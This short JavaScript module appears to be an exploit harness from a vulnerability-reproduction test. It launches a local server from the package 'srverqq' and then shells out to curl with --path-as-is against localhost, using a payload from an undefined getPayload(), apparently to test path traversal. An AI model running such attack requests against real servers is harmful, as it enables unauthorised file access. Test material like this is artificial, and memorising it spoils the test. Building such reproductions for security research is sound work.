function exploitFunction() {
  const { exec } = require("child_process");
  const path = require("path");
  const sleep = require("sleep");

  let server = "node ./node_modules/srverqq/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${getPayload()}"`;

  exec(attack_string, (error, stdout) => {
    if (stdout) {
      return stdout;
    }
    throw new Error("Failed to execute attack command");
  });
}

module.exports = { exploitFunction };